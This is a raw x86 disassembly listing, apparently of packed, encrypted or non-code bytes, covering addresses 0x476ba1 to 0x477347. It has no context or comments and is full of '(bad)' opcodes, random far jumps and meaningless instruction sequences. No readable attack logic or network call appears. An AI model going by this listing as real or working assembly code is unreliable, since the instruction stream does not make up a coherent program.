  476ba1:	jle    0x476b25
  476ba3:	push   edx
  476ba4:	pusha  
  476ba5:	sbb    ch,0x6c
  476ba8:	ja     0x476bc1
  476baa:	inc    esi
  476bab:	ret    0xcfd4
  476bae:	cmp    edx,DWORD PTR [esp+ebp*1-0x11fe024f]
  476bb5:	je     0x476bc3
  476bb7:	cs jg  0x476bb8
  476bba:	call   0x7e41e442
  476bbf:	xor    al,0x5e
  476bc1:	dec    edi
  476bc2:	outs   dx,DWORD PTR ds:[esi]
  476bc3:	aam    0x20
  476bc5:	test   al,0x7a
  476bc7:	cmp    ecx,esi
  476bc9:	ja     0x476c3a
  476bcb:	fild   WORD PTR [ecx-0x53d7d74c]
  476bd1:	add    eax,0x8312eba2
  476bd6:	jmp    0x476be1
  476bd8:	add    dl,BYTE PTR [ebx-0x190ad8d]
  476bde:	hlt    
  476bdf:	or     edx,DWORD PTR [esi]
  476be1:	dec    eax
  476be2:	mov    eax,0xd18965e2
  476be7:	or     ecx,DWORD PTR ss:[edx+0x72a8a36]
  476bee:	pop    ds
  476bef:	adc    al,0x53
  476bf1:	loopne 0x476bd2
  476bf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  476bf4:	fisttp DWORD PTR [edx+0x60186e58]
  476bfa:	mov    cl,BYTE PTR [ebx]
  476bfc:	lock add cl,BYTE PTR [edx+0x7c880a5e]
  476c03:	push   ds
  476c04:	or     ebx,DWORD PTR [eax+0x18]
  476c07:	daa    
  476c08:	mov    al,ds:0xd9402af
  476c0d:	mov    bx,WORD PTR [eax+0x1a]
  476c11:	push   esp
  476c12:	sbb    ebp,DWORD PTR [eax]
  476c14:	ins    BYTE PTR es:[edi],dx
  476c15:	jg     0x476c50
  476c17:	retf   
  476c18:	je     0x476c38
  476c1a:	mov    bh,0x0
  476c1c:	dec    edi
  476c1d:	and    bl,BYTE PTR [eax]
  476c1f:	sbb    esi,DWORD PTR [edx+0x46]
  476c22:	add    al,0x76
  476c24:	mov    ebx,0x2088782d
  476c29:	(bad)  
  476c2a:	jmp    0x476bf4
  476c2c:	jle    0x476bae
  476c2e:	in     eax,0xdf
  476c30:	je     0x476c4c
  476c32:	jmp    0x476c16
  476c34:	cmp    cl,BYTE PTR [ebp-0x751f41f5]
  476c3a:	ins    BYTE PTR es:[edi],dx
  476c3b:	adc    ecx,edx
  476c3d:	ins    BYTE PTR es:[edi],dx
  476c3e:	sbb    BYTE PTR [edx],bl
  476c40:	test   ch,0xcc
  476c43:	out    0x4b,eax
  476c45:	jne    0x476c79
  476c47:	(bad)  
  476c48:	mov    edi,0x57538f11
  476c4d:	mov    edi,DWORD PTR [edx]
  476c4f:	mov    edi,DWORD PTR [edi]
  476c51:	mov    bl,0x4
  476c53:	cmp    BYTE PTR [edi],0x7
  476c56:	je     0x476c61
  476c58:	(bad)  
  476c59:	in     eax,dx
  476c5a:	or     eax,0xf16974e
  476c5f:	add    cl,BYTE PTR [ebx+0x77a204a]
  476c65:	dec    BYTE PTR [ebx+0xb721052]
  476c6b:	ja     0x476c0d
  476c6d:	jmp    DWORD PTR [ebx]
  476c6f:	mov    al,ds:0xeb11e30d
  476c74:	sbb    eax,0x19ebd1ff
  476c79:	mov    dh,0x8a
  476c7b:	jp     0x476ca0
  476c7d:	jmp    0x476c09
  476c7f:	add    esi,ecx
  476c81:	jb     0x476c8d
  476c83:	cld    
  476c84:	enter  0xfdc0,0x7e
  476c88:	push   cs
  476c89:	add    al,0x72
  476c8b:	add    cl,BYTE PTR ds:0xf5261f73
  476c91:	nop
  476c92:	dec    esp
  476c93:	clc    
  476c94:	sbb    al,BYTE PTR [eax]
  476c96:	movsx  ebx,BYTE PTR [edx]
  476c99:	repz pop edi
  476c9b:	push   ds
  476c9c:	xchg   esi,eax
  476c9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  476c9e:	cdq    
  476c9f:	(bad)  
  476ca0:	jle    0x476cba
  476ca2:	add    eax,0xde578fff
  476ca7:	iret   
  476ca8:	adc    BYTE PTR [eax],0x37
  476cab:	mov    esi,DWORD PTR [esi]
  476cad:	in     al,dx
  476cae:	fisttp DWORD PTR ds:[edx-0x215d00a2]
  476cb5:	cmp    al,0x1e
  476cb7:	push   edi
  476cb8:	adc    BYTE PTR [ecx+0x275f4fa],al
  476cbe:	mov    edx,ecx
  476cc0:	jns    0x476c80
  476cc2:	loopne 0x476cc3
  476cc4:	mov    esi,DWORD PTR [edi+0x8]
  476cc7:	cmp    BYTE PTR [edi+0xb],0xfe
  476ccb:	ja     0x476cdc
  476ccd:	jb     0x476cd8
  476ccf:	add    dh,dh
  476cd1:	add    esi,DWORD PTR [eax]
  476cd3:	call   DWORD PTR [esi]
  476cd5:	(bad)  
  476cd6:	ins    BYTE PTR es:[edi],dx
  476cd7:	cmp    edx,esi
  476cd9:	in     eax,0xe6
  476cdb:	lock mov BYTE PTR [eax],cl
  476cde:	mov    DWORD PTR [eax],ecx
  476ce0:	or     al,0xb0
  476ce2:	xchg   BYTE PTR [ebx],dh
  476ce4:	adc    bh,al
  476ce6:	mov    ah,0x9e
  476ce8:	push   esi
  476ce9:	(bad)  
  476cea:	test   ch,0x4f
  476ced:	xor    edi,DWORD PTR [esi+0x7e]
  476cf0:	adc    DWORD PTR [edx+0xa],esi
  476cf3:	inc    DWORD PTR [ebx]
  476cf5:	cmp    bh,bh
  476cf7:	pop    ss
  476cf8:	dec    esi
  476cf9:	aam    0x89
  476cfb:	jno    0x476d1a
  476cfd:	call   0xdbc7:0x912208d7
  476d04:	jmp    DWORD PTR [ebx+0x43ced791]
  476d0a:	mov    cl,BYTE PTR [eax+ecx*1+0x2]
  476d0e:	lods   al,BYTE PTR ds:[esi]
  476d0f:	cmp    al,cl
  476d11:	call   0xe80d:0x42c0c888
  476d18:	stos   BYTE PTR es:[edi],al
  476d19:	mov    cl,al
  476d1b:	inc    edi
  476d1c:	test   al,0x3f
  476d1e:	push   ecx
  476d1f:	enter  0xb21,0xf1
  476d23:	les    ecx,FWORD PTR [ebx-0x5f6887a1]
  476d29:	xlat   BYTE PTR ds:[ebx]
  476d2a:	sbb    eax,0xba034036
  476d2f:	adc    BYTE PTR [eax+0x61],dl
  476d32:	adc    al,0xfc
  476d34:	in     al,0xd1
  476d36:	adc    DWORD PTR [esi-0x1e],0xcd4f4f1b
  476d3d:	fst    DWORD PTR [esp+eax*1+0x6e]
  476d41:	daa    
  476d42:	aaa    
  476d43:	clc    
  476d44:	inc    esi
  476d45:	mov    ds:0xb2f04a1b,eax
  476d4a:	add    DWORD PTR [edi+ecx*1-0x9],ebp
  476d4e:	sub    BYTE PTR [ebx+0x6c],dl
  476d51:	loop   0x476d5f
  476d53:	adc    al,BYTE PTR [ecx+0x45]
  476d56:	xlat   BYTE PTR ds:[ebx]
  476d57:	dec    ebp
  476d58:	mov    esp,0x23da2d40
  476d5d:	add    al,BYTE PTR [eax+ecx*1+0x21]
  476d61:	jns    0x476ceb
  476d63:	dec    ecx
  476d64:	adc    edx,DWORD PTR [edx]
  476d66:	inc    ecx
  476d67:	mov    ah,0xef
  476d69:	inc    ecx
  476d6a:	loope  0x476dc5
  476d6c:	dec    edi
  476d6d:	sbb    cl,BYTE PTR [ebx+0x241b8a1b]
  476d73:	add    eax,0x73b1ddd0
  476d78:	in     al,0x9
  476d7a:	or     eax,0xeb1098fe
  476d7f:	adc    esi,ebx
  476d81:	cmp    BYTE PTR [ebp-0x67],ch
  476d84:	xchg   ecx,eax
  476d85:	dec    esi
  476d86:	outs   dx,BYTE PTR ds:[esi]
  476d87:	or     eax,0xd05cc080
  476d8c:	sbb    cl,ch
  476d8e:	xlat   BYTE PTR ds:[ebx]
  476d8f:	lock lock xchg edi,eax
  476d92:	sti    
  476d93:	xor    al,0xc8
  476d95:	imul   edx,esi,0xf
  476d98:	adc    eax,DWORD PTR [ebx]
  476d9a:	mov    BYTE PTR [eax],0x2c
  476d9d:	mov    WORD PTR [ecx+0xa5c20e3],fs
  476da3:	push   es
  476da4:	loop   0x476d9c
  476da6:	jnp    0x476dad
  476da8:	add    al,0x96
  476daa:	pop    es
  476dab:	mov    al,ds:0x5848fdd7
  476db0:	jmp    0xeb5fa837
  476db5:	arpl   WORD PTR [ebx+0xe1fe0d8],ax
  476dbb:	imul   DWORD PTR [ebx]
  476dbd:	push   DWORD PTR [ebp+0x16]
  476dc0:	and    eax,0xf7c603f1
  476dc5:	dec    edx
  476dc6:	adc    ecx,edx
  476dc8:	stc    
  476dc9:	xlat   BYTE PTR ds:[ebx]
  476dca:	lea    edi,[edx]
  476dcc:	cmp    ebp,DWORD PTR [eax]
  476dce:	clc    
  476dcf:	call   0x16546c9a
  476dd4:	cwde   
  476dd5:	add    eax,esi
  476dd7:	add    ch,BYTE PTR [ebx-0xffdc20b]
  476ddd:	add    ecx,DWORD PTR [eax]
  476ddf:	mov    DWORD PTR [ebp+0x56],esi
  476de2:	adc    BYTE PTR ds:0xfb045b3,bh
  476de8:	mov    ds:0xffd05c0a,eax
  476ded:	push   ebp
  476dee:	xor    dl,BYTE PTR [edx]
  476df0:	jb     0x476d7a
  476df2:	nop
  476df3:	pop    ecx
  476df4:	iret   
  476df5:	scas   al,BYTE PTR es:[edi]
  476df6:	pop    ss
  476df7:	cdq    
  476df8:	push   ss
  476df9:	adc    ecx,DWORD PTR [eax]
  476dfb:	and    DWORD PTR [ecx],edx
  476dfd:	inc    esi
  476dfe:	xchg   ebx,eax
  476dff:	in     eax,0xf1
  476e01:	xchg   ebx,eax
  476e02:	(bad)  
  476e03:	inc    edi
  476e04:	dec    BYTE PTR [ebx+0x329085e]
  476e0a:	add    DWORD PTR [eax+0x70],0x435e94b1
  476e11:	setnp  BYTE PTR [ebp-0x747a20f9]
  476e18:	or     al,0x81
  476e1a:	jecxz  0x476e69
  476e1c:	(bad)  
  476e1e:	and    eax,0x7e
  476e21:	jmp    0xb887:0xf3a4303
  476e28:	iret   
  476e29:	ins    DWORD PTR es:[edi],dx
  476e2a:	out    0x79,eax
  476e2c:	sahf   
  476e2d:	test   esp,0x9d8f0681
  476e33:	mov    eax,0x7edd99c6
  476e38:	(bad)  
  476e39:	fld    TBYTE PTR [ebp-0x6]
  476e3c:	fstp   DWORD PTR [eax]
  476e3e:	fwait
  476e3f:	hlt    
  476e40:	add    DWORD PTR ds:0x8edd1b1a,eax
  476e46:	js     0x476e52
  476e48:	aaa    
  476e49:	adc    al,0x9a
  476e4b:	sbb    al,0x20
  476e4d:	cwde   
  476e4e:	aam    0x16
  476e50:	cld    
  476e51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  476e52:	jnp    0x476e21
  476e54:	sub    BYTE PTR [eax],bh
  476e56:	ret    0x512c
  476e59:	fistp  QWORD PTR [eax]
  476e5b:	ins    DWORD PTR es:[edi],dx
  476e5c:	arpl   WORD PTR [eax-0x4d],bx
  476e5f:	pop    ds
  476e60:	fmul   DWORD PTR ds:0x279a1528
  476e66:	xor    eax,0x9bf95363
  476e6b:	pop    ss
  476e6c:	retf   
  476e6d:	add    edx,ecx
  476e6f:	mov    edx,DWORD PTR [edx]
  476e71:	mov    DWORD PTR [ebp+0x5d],edx
  476e74:	jge    0x476e6e
  476e76:	xchg   al,ah
  476e78:	adc    al,0x8c
  476e7a:	fld    TBYTE PTR [edx-0x69]
  476e7d:	push   ebp
  476e7e:	or     eax,0x470033cf
  476e83:	sbb    BYTE PTR [esp+ecx*4],dl
  476e86:	push   es
  476e87:	inc    ecx
  476e88:	push   esi
  476e89:	pusha  
  476e8a:	ds clc 
  476e8c:	cmp    al,0x6c
  476e8e:	adc    DWORD PTR [edx*2-0x34903b7d],0x85f28220
  476e99:	cmc    
  476e9a:	sub    al,bh
  476e9c:	pop    eax
  476e9d:	nop
  476e9e:	cwde   
  476e9f:	nop
  476ea0:	frstor [esi-0x6]
  476ea3:	rcr    BYTE PTR [esi],1
  476ea5:	in     eax,dx
  476ea6:	dec    edx
  476ea7:	mov    edx,DWORD PTR [ebp-0x21]
  476eaa:	cmp    al,0x7f
  476eac:	dec    esi
  476ead:	nop
  476eae:	pop    edx
  476eaf:	xor    BYTE PTR [ebp+0x35],0x2d
  476eb3:	ja     0x476f2f
  476eb5:	sahf   
  476eb6:	out    0x79,eax
  476eb8:	push   cs
  476eb9:	and    al,0xab
  476ebb:	mov    edi,0xa1f6e3d1
  476ec0:	loopne 0x476e56
  476ec2:	jl     0x476ecc
  476ec4:	adc    eax,0x871f4deb
  476ec9:	add    BYTE PTR [edi-0x3f],0xeb
  476ecd:	cmp    ebx,DWORD PTR [ecx]
  476ecf:	jmp    0x476ef9
  476ed1:	adc    ebp,ebx
  476ed3:	push   ss
  476ed4:	int3   
  476ed5:	adc    BYTE PTR [edx],dl
  476ed7:	add    al,0xd
  476ed9:	int    0x92
  476edb:	pop    es
  476edc:	aad    0x2d
  476ede:	add    BYTE PTR [eax+0x1c],al
  476ee1:	inc    esi
  476ee2:	ja     0x476ec8
  476ee4:	add    BYTE PTR [edi+0x7b],cl
  476ee7:	xlat   BYTE PTR ds:[ebx]
  476ee8:	add    DWORD PTR ds:0x5a8b8728,0x5e
  476eef:	jp     0x476f08
  476ef1:	mov    esi,0xa801be01
  476ef6:	push   DWORD PTR [ecx+0x4]
  476ef9:	push   DWORD PTR [ecx]
  476efb:	lods   eax,DWORD PTR ds:[esi]
  476efc:	fild   DWORD PTR [ebx]
  476efe:	sbb    bh,bh
  476f00:	adc    ebx,DWORD PTR [ebx-0x433eb69d]
  476f06:	jo     0x476eab
  476f08:	add    esp,ebp
  476f0a:	outs   dx,BYTE PTR ds:[esi]
  476f0b:	sbb    al,cl
  476f0d:	js     0x476f20
  476f0f:	mov    ebx,DWORD PTR [ecx+0x4]
  476f12:	add    eax,0xf703b85f
  476f17:	(bad)  [ebp-0x75]
  476f1a:	dec    edx
  476f1b:	or     BYTE PTR [edi+0x18],dh
  476f1e:	jae    0x476edd
  476f20:	jne    0x476f32
  476f22:	and    ecx,ebp
  476f24:	or     esp,DWORD PTR ds:0x72c81317
  476f2a:	adc    edi,eax
  476f2c:	push   ds
  476f2d:	sub    BYTE PTR [ebp+0xc],cl
  476f30:	jbe    0x476f7a
  476f32:	add    al,0x87
  476f34:	in     eax,0xa6
  476f36:	add    cl,BYTE PTR [ebp-0x37b5b15c]
  476f3c:	fld    DWORD PTR [ecx-0x4dd9321d]
  476f42:	retf   
  476f43:	sti    
  476f44:	pop    ss
  476f45:	arpl   WORD PTR [esi+0xc],ax
  476f48:	mov    esp,0xba58383f
  476f4d:	iret   
  476f4e:	dec    edx
  476f4f:	(bad)  
  476f50:	jmp    0x476f93
  476f52:	cmp    eax,0x77752538
  476f57:	xchg   esp,eax
  476f58:	jnp    0xd9212e76
  476f5e:	xor    BYTE PTR [ebx+ecx*4+0x69],dh
  476f62:	aam    0xeb
  476f64:	add    al,0xa
  476f66:	push   ss
  476f67:	add    al,0x36
  476f69:	mov    ebp,0x5cd1421f
  476f6e:	popa   
  476f6f:	cmp    esi,DWORD PTR [ebp+0x54ff1efb]
  476f75:	cmp    dl,BYTE PTR [esi]
  476f77:	into   
  476f78:	aam    0x1b
  476f7a:	enter  0xf139,0x21
  476f7e:	xor    eax,0x4216b21f
  476f83:	sub    cl,dh
  476f85:	jae    0x476fc7
  476f87:	pop    ds
  476f88:	mov    eax,0x1630b7b0
  476f8d:	xor    DWORD PTR [esi+ecx*2-0x1],0x1c3c81ba
  476f95:	dec    edi
  476f96:	mov    ecx,0x17d4116
  476f9b:	jmp    0x476f5f
  476f9d:	and    eax,0x44e9afc3
  476fa2:	ja     0x476f63
  476fa4:	lods   eax,DWORD PTR ds:[esi]
  476fa5:	pop    esp
  476fa6:	enter  0x16f0,0x44
  476faa:	add    BYTE PTR [edi],dl
  476fac:	add    ecx,DWORD PTR cs:[edx]
  476faf:	push   esp
  476fb0:	inc    ecx
  476fb1:	ins    BYTE PTR es:[edi],dx
  476fb2:	imul   ebx,DWORD PTR [edi+eiz*2+0x6d],0x6d6e67fc
  476fba:	outs   dx,BYTE PTR gs:[esi]
  476fbc:	je     0x477001
  476fbe:	idiv   esp
  476fc0:	pusha  
  476fc1:	(bad)  
  476fc3:	mov    ebx,0x654c3424
  476fc8:	data16 je 0x477015
  476fcb:	loopne 0x477038
  476fcd:	xchg   BYTE PTR [ebp+0x796669f6],dh
  476fd3:	push   cs
  476fd4:	sbb    dl,BYTE PTR [edx+0x4a]
  476fd7:	push   0x6043081d
  476fdc:	fst    st(5)
  476fde:	and    dh,bh
  476fe0:	gs jb  0x476fea
  476fe3:	inc    ebx
  476fe4:	ins    BYTE PTR es:[edi],dx
  476fe5:	popa   
  476fe6:	push   ds
  476fe7:	jae    0x476f79
  476fe9:	dec    esp
  476fea:	xchg   edi,eax
  476feb:	or     DWORD PTR [edi+0x54fa01af],ebx
  476ff1:	inc    edx
  476ff2:	imul   eax,DWORD PTR [ecx+ebp*2+0x16],0x48039565
  476ffa:	pop    ss
  476ffb:	jnp    0x476ff4
  476ffd:	push   esi
  476ffe:	bound  esp,QWORD PTR ds:[esp+edx*2+0x6f]
  477003:	test   DWORD PTR [edx],ebx
  477005:	nop    esi
  477008:	loopne 0x476fcb
  47700a:	cmp    ch,BYTE PTR [ecx]
  47700c:	adc    al,0x1b
  47700e:	dec    esi
  47700f:	outs   dx,DWORD PTR ds:[esi]
  477010:	sbb    DWORD PTR [eax],ebx
  477012:	sub    DWORD PTR [esi],ebp
  477014:	or     eax,0x1ed60c41
  477019:	adc    edx,DWORD PTR [edi+0x10]
  47701c:	test   BYTE PTR [edi+0x6e],0x6c
  477020:	jns    0x476fff
  477022:	xchg   BYTE PTR [esi+ebp*4+0x6f7a5f7b],bh
  477029:	(bad)  
  47702a:	rcl    DWORD PTR [eax],1
  47702c:	mov    eax,0xee360720
  477031:	ins    DWORD PTR es:[edi],dx
  477032:	mov    bl,0x76
  477034:	push   ebx
  477035:	push   0xe056269
  47703a:	mov    ?,WORD PTR [esi+eax*1+0xa]
  47703e:	inc    ebx
  47703f:	je     0x4770b3
  477041:	ins    BYTE PTR es:[edi],dx
  477042:	or     al,0x75
  477044:	mov    edi,0x368be77d
  477049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47704a:	or     BYTE PTR [esi],cl
  47704c:	dec    ebp
  47704d:	imul   esp,DWORD PTR [esp+eiz*2+0x6c],0xf6e51065
  477055:	or     BYTE PTR [esi+0x18108751],cl
  47705b:	test   BYTE PTR [esi],al
  47705d:	or     edx,DWORD PTR [ebx+ebp*2-0x52]
  477061:	mov    bh,0x89
  477063:	aas    
  477064:	add    DWORD PTR [ecx-0x77d1d72a],ebp
  47706a:	xor    cl,cl
  47706c:	clc    
  47706d:	add    DWORD PTR [esp+edx*2],ecx
  477070:	dec    eax
  477071:	push   0xffffff9d
  477073:	mov    dl,dl
  477075:	aas    
  477076:	pusha  
  477077:	gs js  0x4770ee
  47707a:	add    al,0x1
  47707c:	fst    DWORD PTR [eax-0x39616bbc]
  477082:	repnz add ecx,DWORD PTR ss:[ecx]
  477086:	push   cs
  477087:	test   eax,0x835c37b7
  47708c:	inc    eax
  47708d:	cs or  edx,ebx
  477090:	dec    ebx
  477091:	gs jns 0x47710b
  477094:	int3   
  477095:	or     eax,0x1242cedb
  47709a:	jae    0x477075
  47709c:	jl     0x477045
  47709e:	outs   dx,BYTE PTR ds:[esi]
  47709f:	jo     0x4770f2
  4770a1:	mov    edx,0x7543eda7
  4770a6:	je     0x4770d1
  4770a8:	fadd   st,st(1)
  4770aa:	pusha  
  4770ab:	ficom  WORD PTR [esi+edx*8+0x45cd1008]
  4770b2:	jbe    0x4770fe
  4770b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4770b5:	loope  0x47712d
  4770b7:	enter  0x84c,0x6
  4770bb:	push   ebx
  4770bc:	fsub   DWORD PTR [eax+edx*1-0x22]
  4770c0:	inc    esi
  4770c1:	sub    ah,BYTE PTR [ebp-0x1f]
  4770c4:	mov    eax,0x8e0bb340
  4770c9:	sbb    DWORD PTR [esi+0x1],edx
  4770cc:	mov    ds:0xaf895052,eax
  4770d2:	jmp    0x6dd0:0x68d285a
  4770d9:	push   DWORD PTR [edi+0x2e4e0c44]
  4770df:	fs mov esp,0x8e22145e
  4770e5:	sub    ah,BYTE PTR [edi+0x46]
  4770e8:	push   edx
  4770e9:	daa    
  4770ea:	pop    ss
  4770eb:	leave  
  4770ec:	les    edi,FWORD PTR [edi-0x58e73b3c]
  4770f2:	popa   
  4770f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4770f4:	xchg   edx,eax
  4770f5:	sbb    DWORD PTR ds:0xada272a9,ecx
  4770fb:	dec    eax
  4770fc:	pop    esi
  4770fd:	and    BYTE PTR [edx],bl
  4770ff:	mov    bh,0x20
  477101:	sbb    bl,BYTE PTR [edi+0x45]
  477104:	xor    eax,DWORD PTR ds:0x6eac4f0b
  47710a:	mov    bl,0x78
  47710c:	adc    DWORD PTR [edi+esi*4],ecx
  47710f:	push   0xb9273eaf
  477114:	dec    eax
  477115:	mov    esi,0xaf720bcb
  47711a:	rcl    al,1
  47711c:	jb     0x477158
  47711e:	xchg   ebp,eax
  47711f:	cmp    al,0x2c
  477121:	sbb    cl,BYTE PTR [edx]
  477123:	inc    ebp
  477124:	pop    ebp
  477125:	in     al,0x44
  477127:	sti    
  477128:	add    edi,DWORD PTR [edi]
  47712a:	sub    BYTE PTR [ebx],bl
  47712c:	scas   eax,DWORD PTR es:[edi]
  47712d:	sub    BYTE PTR [ebx],bl
  47712f:	aaa    
  477130:	or     BYTE PTR [ecx+0xa],al
  477133:	pop    esi
  477134:	retf   
  477135:	add    bh,BYTE PTR [ecx-0x7f4e6098]
  47713b:	scas   eax,DWORD PTR es:[edi]
  47713c:	adc    BYTE PTR [edx+0x1d],0x3d
  477140:	mov    ebp,0xde21450e
  477145:	inc    esi
  477146:	sbb    BYTE PTR [eax],dl
  477148:	frstor [edx-0x236f37d3]
  47714e:	mov    bh,0x3e
  477150:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  477151:	jle    0x4770df
  477153:	sbb    DWORD PTR [esi+0x16],edx
  477156:	mov    bl,0xe6
  477158:	cmp    BYTE PTR [eax+edx*4],bl
  47715b:	add    bh,BYTE PTR [ecx]
  47715d:	shl    DWORD PTR [edi-0x2e8de3c8],1
  477163:	inc    esi
  477164:	fmulp  st(6),st
  477166:	dec    esp
  477167:	imul   esi,DWORD PTR [ebx+0x74],0x2690af90
  47716e:	inc    esp
  47716f:	jle    0x477181
  477171:	inc    edx
  477172:	imul   esi,DWORD PTR [ebx+esi*2+0x4c],0xd8ae40ad
  47717a:	dec    ebp
  47717b:	mov    ecx,0xe0b5e8af
  477180:	add    DWORD PTR [eax+0x6],edx
  477183:	stos   DWORD PTR es:[edi],eax
  477184:	imul   eax,DWORD PTR [eax+0x4e],0x14
  477188:	jl     0x477191
  47718a:	dec    eax
  47718b:	sbb    eax,0x801d486f
  477190:	popf   
  477191:	and    ah,BYTE PTR [esi+0x706d960f]
  477197:	pop    ebx
  477198:	mov    ah,0x99
  47719a:	dec    ecx
  47719b:	(bad)  
  47719c:	push   esp
  47719d:	mov    ebp,0x513fb7a4
  4771a2:	repnz xchg ecx,eax
  4771a4:	test   BYTE PTR [esi+0x2b6c7400],ch
  4771aa:	push   ss
  4771ab:	retf   
  4771ac:	sets   BYTE PTR [eax+0xa6372]
  4771b3:	push   ds
  4771b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4771b5:	inc    eax
  4771b6:	dec    esi
  4771b7:	adc    al,0x6f
  4771b9:	add    BYTE PTR [esi],bl
  4771bb:	adc    DWORD PTR [edx+ebp*2+0x1a172444],eax
  4771c2:	pop    ss
  4771c3:	lods   eax,DWORD PTR ds:[esi]
  4771c4:	retf   
  4771c5:	pop    ebx
  4771c6:	xor    DWORD PTR [esi+0x60],edi
  4771c9:	mov    edi,0xc516270
  4771ce:	cmp    eax,0xaf360f10
  4771d3:	adc    edi,DWORD PTR [edx+0x408e4e76]
  4771d9:	(bad)  
  4771da:	inc    ecx
  4771db:	push   es
  4771dc:	inc    ebx
  4771dd:	push   esp
  4771de:	inc    eax
  4771df:	xchg   edx,eax
  4771e0:	data16 icebp 
  4771e2:	imul   edx,esp,0xc6035405
  4771e8:	les    ebp,FWORD PTR [edx]
  4771ea:	adc    al,0xd1
  4771ec:	sub    eax,0xa2df243f
  4771f1:	jge    0x477186
  4771f3:	lahf   
  4771f4:	sbb    BYTE PTR [ecx+eax*2+0x0],al
  4771f8:	or     esi,DWORD PTR [edx-0x4350e0e4]
  4771fe:	push   0xffffff86
  477200:	pop    esp
  477201:	aas    
  477202:	xchg   DWORD PTR [ebp+eax*2+0x1918158b],ecx
  477209:	push   edi
  47720a:	pop    ss
  47720b:	push   esi
  47720c:	jo     0x4771b5
  47720e:	push   ebp
  47720f:	repnz fidiv WORD PTR [ebp+0x167c1f9c]
  477216:	mov    ah,BYTE PTR [esi-0x25843dfc]
  47721c:	out    0x28,al
  47721e:	inc    edi
  47721f:	cmp    BYTE PTR [eax+0x6],cl
  477222:	inc    eax
  477223:	push   esp
  477224:	push   ss
  477225:	add    dl,BYTE PTR [esp+esi*1-0x8]
  477229:	cs loop 0x47722a
  47722c:	push   esp
  47722e:	sbb    al,BYTE PTR [eax+ecx*2-0x75]
  477232:	push   eax
  477233:	add    dh,BYTE PTR [ebx-0x7f]
  477236:	jne    0x47722e
  477238:	sbb    BYTE PTR [esp+eax*4+0x2507c7e6],al
  47723f:	es cmp al,0x43
  477242:	push   es
  477243:	or     ecx,edx
  477245:	test   DWORD PTR [eax],edx
  477247:	dec    eax
  477248:	into   
  477249:	ror    bh,1
  47724b:	pop    es
  47724c:	(bad)  
  47724d:	ins    DWORD PTR es:[edi],dx
  47724e:	(bad)  
  47724f:	cmp    esp,DWORD PTR [eax+0xc]
  477252:	sbb    edi,DWORD PTR [eax+0x39]
  477255:	inc    esp
  477256:	adc    esp,DWORD PTR [esp+ecx*8-0x79]
  47725a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47725b:	repz fmulp st(4),st
  47725e:	shl    DWORD PTR [esi-0x31],0x6
  477262:	fcos   
  477264:	inc    ecx
  477265:	jnp    0x477230
  477267:	push   edi
  477268:	in     eax,0x1f
  47726a:	inc    ecx
  47726b:	pusha  
  47726c:	and    BYTE PTR [ecx+esi*8],bl
  47726f:	(bad)  
  477270:	jb     0x4772d2
  477272:	mov    eax,0x9c167077
  477277:	push   es
  477278:	xchg   DWORD PTR [edx+0x6e40020],eax
  47727e:	aaa    
  47727f:	and    al,0x46
  477281:	(bad)  
  477283:	dec    eax
  477284:	inc    ecx
  477285:	in     eax,0x14
  477287:	cwde   
  477288:	clc    
  477289:	mov    BYTE PTR [ecx+0x41],cl
  47728c:	iret   
  47728d:	adc    al,0x11
  47728f:	adc    al,0xa4
  477291:	enter  0x15d2,0x43
  477295:	fst    st(3)
  477297:	and    cl,al
  477299:	mov    edx,0x3d3507e7
  47729e:	cwde   
  47729f:	test   eax,0x1386077e
  4772a4:	nop
  4772a5:	int3   
  4772a6:	sub    BYTE PTR [edi],cl
  4772a8:	cmovns ecx,ecx
  4772ab:	(bad)  
  4772ac:	(bad)  
  4772ad:	mov    ebx,0x644173fb
  4772b2:	popa   
  4772b3:	jo     0x477325
  4772b5:	lds    eax,FWORD PTR [ecx]
  4772b7:	xor    al,0x2f
  4772b9:	pushf  
  4772ba:	jae    0x4772a8
  4772bc:	push   edx
  4772bd:	rcl    BYTE PTR [ecx],1
  4772bf:	sahf   
  4772c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4772c1:	add    BYTE PTR [eax],ah
  4772c3:	scas   eax,DWORD PTR es:[edi]
  4772c4:	cmp    eax,0x1b05da82
  4772c9:	sbb    al,0xc2
  4772cb:	imul   edi,ebx,0xb7214cce
  4772d1:	xor    WORD PTR [ebp-0x13e933c9],0x1f
  4772d9:	xlat   BYTE PTR ds:[ebx]
  4772da:	fisub  WORD PTR [ecx]
  4772dc:	xchg   ecx,eax
  4772dd:	add    edx,DWORD PTR ds:0x38b71093
  4772e3:	dec    edx
  4772e4:	aas    
  4772e5:	dec    eax
  4772e6:	or     eax,0x724c70c0
  4772eb:	dec    ebx
  4772ec:	mov    bh,0xf4
  4772ee:	dec    esi
  4772ef:	data16 mov bl,0x7d
  4772f2:	paddb  xmm3,XMMWORD PTR [edi+ecx*2+0x6]
  4772f8:	clc    
  4772f9:	push   ebx
  4772fa:	sub    al,0x54
  4772fc:	fidivr WORD PTR [ebp-0x66]
  4772ff:	int    0x94
  477301:	push   ebp
  477302:	sbb    al,0x56
  477304:	hlt    
  477305:	jl     0x47735e
  477307:	pop    esi
  477308:	jbe    0x477296
  47730a:	sti    
  47730b:	cmp    al,0xdf
  47730d:	sti    
  47730e:	push   es
  47730f:	mov    al,0x4a
  477311:	pop    edi
  477312:	addr16 or al,0x0
  477315:	test   BYTE PTR [eax-0x2],dl
  477318:	mov    ebp,0x51da7766
  47731d:	push   es
  47731e:	in     al,0x2f
  477320:	sbb    BYTE PTR [edx+0x48],dl
  477323:	push   es
  477324:	pushf  
  477325:	pusha  
  477326:	clc    
  477327:	cmp    al,0xcf
  477329:	setle  al
  47732c:	cmp    ah,cl
  47732e:	push   ebp
  47732f:	mov    bh,0x6
  477331:	aaa    
  477332:	mov    esp,0x843c862
  477337:	push   esp
  477338:	and    DWORD PTR [eax-0x7cf2e751],edx
  47733e:	mov    cl,0x7
  477340:	sbb    eax,0xedd285ea
  477345:	jne    0x4772da
  477347:	mov    fs,WORD PTR [edx]
